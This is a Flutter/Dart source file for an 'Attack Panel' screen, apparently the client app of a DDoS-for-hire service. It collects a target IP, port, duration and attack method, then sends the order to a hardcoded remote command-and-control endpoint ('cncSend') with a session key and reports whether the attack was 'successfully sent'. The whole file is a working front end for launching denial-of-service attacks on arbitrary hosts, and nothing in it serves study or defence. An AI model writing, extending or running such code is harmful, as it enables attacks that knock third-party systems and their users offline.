import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

class AttackPanel extends StatefulWidget {
  final String sessionKey;
  final List<Map<String, dynamic>> listDoos;

  const AttackPanel({
    super.key,
    required this.sessionKey,
    required this.listDoos,
  });

  @override
  State<AttackPanel> createState() => _AttackPanelState();
}

class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  final portController = TextEditingController();
  final String baseUrl = "http://papii.queen-official.com:2445";
  late AnimationController _controller;
  late AnimationController _pulseController;
  late Animation<double> _pulseAnimation;
  String selectedDoosId = "";
  double attackDuration = 60;
  bool _isHovering = false;

  // ========== TEMA SANGAR GELAP + AKSEN MERAH TUA ==========
  final Color _bgDark = const Color(0xFF0A0A0A);
  final Color _cardColor = const Color(0xFF151515);
  final Color _surfaceColor = const Color(0xFF1A1A1E);
  final Color _accentColor = const Color(0xFFB71C1C);   // merah gelap tegas
  final Color _accentSoft = const Color(0xFF8B0000);
  final Color _textPrimary = const Color(0xFFE8E8E8);
  final Color _textSecondary = const Color(0xFF9CA3AF);
  final Color _borderColor = const Color(0xFF2D2D30);
  final Color _glowColor = const Color(0xFFB71C1C);
  final Color _dangerColor = const Color(0xFFEF4444);

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);
    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    )..repeat();
    _pulseAnimation = Tween<double>(begin: 1.0, end: 1.15).animate(
      CurvedAnimation(parent: _pulseController, curve: Curves.easeInOut),
    );

    if (widget.listDoos.isNotEmpty) {
      selectedDoosId = widget.listDoos[0]['ddos_id'];
    }
  }

  Future<void> _sendDoos() async {
    final target = targetController.text.trim();
    final port = portController.text.trim();
    final key = widget.sessionKey;
    final int duration = attackDuration.toInt();

    if (target.isEmpty || key.isEmpty) {
      _showAlert("INVALID INPUT", "Target IP cannot be empty.");
      return;
    }

    if (selectedDoosId != "icmp" && (port.isEmpty || int.tryParse(port) == null)) {
      _showAlert("INVALID PORT", "Please input a valid port.");
      return;
    }

    try {
      final uri = Uri.parse(
          "$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration");
      final res = await http.get(uri);
      final data = jsonDecode(res.body);
      print(data);

      if (data["cooldown"] == true) {
        _showAlert("COOLDOWN", "Please wait a moment before sending again.");
      } else if (data["valid"] == false) {
        _showAlert("INVALID KEY", "Your session key is invalid. Please log in again.");
      } else if (data["sended"] == false) {
        _showAlert("FAILED", "Failed to send attack. The server may be under maintenance.");
      } else {
        _showAlert("SUCCESS", "Attack has been successfully sent to $target.");
      }
    } catch (_) {
      _showAlert("ERROR", "An unexpected error occurred. Please try again.");
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: _cardColor,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(16),
          side: BorderSide(color: _accentColor, width: 1.5),
        ),
        title: Row(
          children: [
            Icon(
              title == "SUCCESS" ? Icons.check_circle_outline : Icons.warning_amber_rounded,
              color: _accentColor,
            ),
            const SizedBox(width: 8),
            Text(title, style: TextStyle(color: _textPrimary, fontFamily: 'Orbitron', fontWeight: FontWeight.bold)),
          ],
        ),
        content: Text(msg, style: TextStyle(color: _textSecondary, fontFamily: 'ShareTechMono')),
        actions: [
          Center(
            child: Container(
              decoration: BoxDecoration(
                border: Border.all(color: _accentColor),
                borderRadius: BorderRadius.circular(8),
              ),
              child: TextButton(
                onPressed: () => Navigator.pop(context),
                child: Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 20),
                  child: Text("OK", style: TextStyle(color: _accentColor, fontWeight: FontWeight.bold)),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  String _getSelectedMethodName() {
    final method = widget.listDoos.firstWhere((d) => d['ddos_id'] == selectedDoosId, orElse: () => {'ddos_name': 'Unknown'});
    return method['ddos_name'] ?? 'Unknown';
  }

  @override
  Widget build(BuildContext context) {
    final isIcmp = selectedDoosId.toLowerCase() == "icmp";
    return Scaffold(
      backgroundColor: _bgDark,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: Icon(Icons.arrow_back_ios_new, color: _accentColor),
          onPressed: () => Navigator.pop(context),
        ),
        title: Text(
          "ATTACK PANEL",
          style: TextStyle(
            color: _textPrimary,
            fontSize: 18,
            fontFamily: 'Orbitron',
            fontWeight: FontWeight.bold,
            letterSpacing: 1.5,
            shadows: [Shadow(color: _glowColor.withOpacity(0.4), blurRadius: 8)],
          ),
        ),
        centerTitle: true,
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(1),
          child: Container(
            height: 1,
            margin: const EdgeInsets.symmetric(horizontal: 20),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [Colors.transparent, _accentColor, Colors.transparent],
              ),
            ),
          ),
        ),
      ),
      body: Stack(
        children: [
          // Background pattern - DIPERBAIKI
          Container(
            decoration: BoxDecoration(
              image: DecorationImage(
                image: NetworkImage('https://www.transparenttextures.com/patterns/carbon-fiber.png'),
                fit: BoxFit.cover,
                repeat: ImageRepeat.repeat,
                opacity: 0.03,
              ),
            ),
          ),
          // Glass overlay
          Positioned(
            top: 0,
            left: 0,
            right: 0,
            height: 200,
            child: BackdropFilter(
              filter: ImageFilter.blur(sigmaX: 20, sigmaY: 20),
              child: Container(
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [_accentColor.withOpacity(0.05), Colors.transparent],
                  ),
                ),
              ),
            ),
          ),
          SafeArea(
            child: SingleChildScrollView(
              padding: const EdgeInsets.all(20),
              child: Column(
                children: [
                  // Animated Logo / Icon
                  FadeTransition(
                    opacity: Tween(begin: 0.5, end: 1.0).animate(_controller),
                    child: Container(
                      width: 110,
                      height: 110,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        gradient: LinearGradient(
                          colors: [_accentColor.withOpacity(0.2), Colors.transparent],
                          begin: Alignment.topLeft,
                          end: Alignment.bottomRight,
                        ),
                        border: Border.all(color: _accentColor.withOpacity(0.6), width: 2),
                        boxShadow: [
                          BoxShadow(color: _glowColor.withOpacity(0.4), blurRadius: 25, spreadRadius: 4),
                        ],
                      ),
                      child: Center(
                        child: Icon(Icons.flash_on, color: _accentColor, size: 54),
                      ),
                    ),
                  ),
                  const SizedBox(height: 16),
                  Text(
                    "TARGET INPUT & METHODS",
                    style: TextStyle(
                      color: _textPrimary,
                      fontFamily: 'Orbitron',
                      fontSize: 18,
                      fontWeight: FontWeight.bold,
                      letterSpacing: 1,
                    ),
                  ),
                  const SizedBox(height: 8),
                  Container(
                    width: 60,
                    height: 2,
                    color: _accentColor,
                  ),
                  const SizedBox(height: 24),

                  // === Target Input Card ===
                  _buildInputCard(
                    icon: Icons.computer,
                    title: "TARGET IP",
                    child: TextField(
                      controller: targetController,
                      style: TextStyle(color: _textPrimary, fontSize: 14),
                      cursorColor: _accentColor,
                      decoration: _inputStyle("e.g. 1.1.1.1"),
                    ),
                  ),
                  const SizedBox(height: 20),

                  // === Port Input Card ===
                  _buildInputCard(
                    icon: Icons.wifi_tethering,
                    title: "PORT",
                    child: TextField(
                      controller: portController,
                      enabled: !isIcmp,
                      keyboardType: TextInputType.number,
                      style: TextStyle(color: isIcmp ? _textSecondary : _textPrimary, fontSize: 14),
                      cursorColor: isIcmp ? _textSecondary : _accentColor,
                      decoration: _inputStyle(
                        isIcmp ? "ICMP does not use port" : "e.g. 80",
                        isIcmp: isIcmp,
                      ),
                    ),
                  ),
                  const SizedBox(height: 20),

                  // === Duration Slider ===
                  _buildInputCard(
                    icon: Icons.timer,
                    title: "ATTACK DURATION",
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Row(
                          children: [
                            Icon(Icons.timer_outlined, color: _accentColor, size: 16),
                            const SizedBox(width: 8),
                            Text(
                              "${attackDuration.toInt()} seconds",
                              style: TextStyle(color: _textPrimary, fontSize: 15, fontWeight: FontWeight.bold),
                            ),
                          ],
                        ),
                        const SizedBox(height: 8),
                        Slider(
                          value: attackDuration,
                          min: 10,
                          max: 300,
                          divisions: 29,
                          label: "${attackDuration.toInt()}s",
                          activeColor: _accentColor,
                          inactiveColor: _textSecondary.withOpacity(0.2),
                          thumbColor: _accentColor,
                          onChanged: (value) {
                            setState(() => attackDuration = value);
                          },
                        ),
                        Row(
                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                          children: [
                            Text("10s", style: TextStyle(color: _textSecondary, fontSize: 10)),
                            Text("300s", style: TextStyle(color: _textSecondary, fontSize: 10)),
                          ],
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(height: 20),

                  // === Dropdown Attack Methods ===
                  _buildInputCard(
                    icon: Icons.flash_on,
                    title: "ATTACK METHOD",
                    child: DropdownButtonHideUnderline(
                      child: DropdownButton<String>(
                        dropdownColor: _cardColor,
                        value: selectedDoosId,
                        isExpanded: true,
                        iconEnabledColor: _accentColor,
                        style: TextStyle(color: _textPrimary, fontSize: 14, fontFamily: 'ShareTechMono'),
                        items: widget.listDoos.map((doos) {
                          return DropdownMenuItem<String>(
                            value: doos['ddos_id'],
                            child: Row(
                              children: [
                                Icon(Icons.bolt, color: _accentColor, size: 16),
                                const SizedBox(width: 8),
                                Text(doos['ddos_name']),
                              ],
                            ),
                          );
                        }).toList(),
                        onChanged: (value) {
                          setState(() {
                            selectedDoosId = value!;
                          });
                        },
                      ),
                    ),
                  ),
                  const SizedBox(height: 16),

                  // Info panel (detail metode)
                  Container(
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: _surfaceColor,
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: _borderColor),
                    ),
                    child: Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(
                            color: _accentColor.withOpacity(0.15),
                            shape: BoxShape.circle,
                          ),
                          child: Icon(Icons.info_outline, color: _accentColor, size: 18),
                        ),
                        const SizedBox(width: 12),
                        Expanded(
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Text(
                                "ACTIVE METHOD",
                                style: TextStyle(color: _textSecondary, fontSize: 9, letterSpacing: 1),
                              ),
                              Text(
                                _getSelectedMethodName(),
                                style: TextStyle(color: _accentColor, fontSize: 13, fontWeight: FontWeight.bold),
                              ),
                            ],
                          ),
                        ),
                        if (isIcmp)
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                            decoration: BoxDecoration(
                              color: _accentColor.withOpacity(0.2),
                              borderRadius: BorderRadius.circular(12),
                            ),
                            child: Text(
                              "NO PORT NEEDED",
                              style: TextStyle(color: _accentColor, fontSize: 9, fontWeight: FontWeight.bold),
                            ),
                          ),
                      ],
                    ),
                  ),
                  const SizedBox(height: 32),

                  // === Send Button dengan animasi pulse ===
                  AnimatedBuilder(
                    animation: _pulseAnimation,
                    builder: (context, child) {
                      return Transform.scale(
                        scale: _pulseAnimation.value,
                        child: child,
                      );
                    },
                    child: SizedBox(
                      width: double.infinity,
                      child: ElevatedButton.icon(
                        onPressed: _sendDoos,
                        icon: Icon(Icons.bolt, color: _textPrimary, size: 24),
                        label: Text(
                          "LAUNCH ATTACK",
                          style: TextStyle(
                            fontSize: 16,
                            fontFamily: 'Orbitron',
                            fontWeight: FontWeight.bold,
                            letterSpacing: 1.5,
                            color: _textPrimary,
                          ),
                        ),
                        style: ElevatedButton.styleFrom(
                          backgroundColor: _accentColor,
                          padding: const EdgeInsets.symmetric(vertical: 16),
                          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
                          elevation: 8,
                          shadowColor: _glowColor.withOpacity(0.6),
                        ),
                      ),
                    ),
                  ),

                  const SizedBox(height: 24),

                  // Footer warning
                  Container(
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: _surfaceColor,
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: _borderColor),
                    ),
                    child: Row(
                      children: [
                        Icon(Icons.warning_amber_rounded, color: _dangerColor, size: 18),
                        const SizedBox(width: 10),
                        Expanded(
                          child: Text(
                            "This action is irreversible and will be logged. Use responsibly.",
                            style: TextStyle(color: _textSecondary, fontSize: 11, fontFamily: 'ShareTechMono'),
                          ),
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(height: 20),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildInputCard({required IconData icon, required String title, required Widget child}) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: _cardColor,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _borderColor, width: 1),
        boxShadow: [
          BoxShadow(color: Colors.black54, blurRadius: 8, offset: const Offset(0, 4)),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: _accentColor.withOpacity(0.15),
                  shape: BoxShape.circle,
                ),
                child: Icon(icon, color: _accentColor, size: 18),
              ),
              const SizedBox(width: 10),
              Text(
                title,
                style: TextStyle(color: _textPrimary, fontWeight: FontWeight.bold, fontSize: 14, letterSpacing: 0.8),
              ),
            ],
          ),
          const SizedBox(height: 12),
          child,
        ],
      ),
    );
  }

  InputDecoration _inputStyle(String hint, {bool isIcmp = false}) {
    return InputDecoration(
      hintText: hint,
      hintStyle: TextStyle(color: isIcmp ? _textSecondary : _accentColor.withOpacity(0.6), fontSize: 13),
      filled: true,
      fillColor: _bgDark,
      contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
      enabledBorder: OutlineInputBorder(
        borderSide: BorderSide(color: isIcmp ? _textSecondary.withOpacity(0.5) : _borderColor),
        borderRadius: BorderRadius.circular(12),
      ),
      focusedBorder: OutlineInputBorder(
        borderSide: BorderSide(color: isIcmp ? _textSecondary : _accentColor, width: 1.5),
        borderRadius: BorderRadius.circular(12),
      ),
    );
  }

  @override
  void dispose() {
    _controller.dispose();
    _pulseController.dispose();
    targetController.dispose();
    portController.dispose();
    super.dispose();
  }
}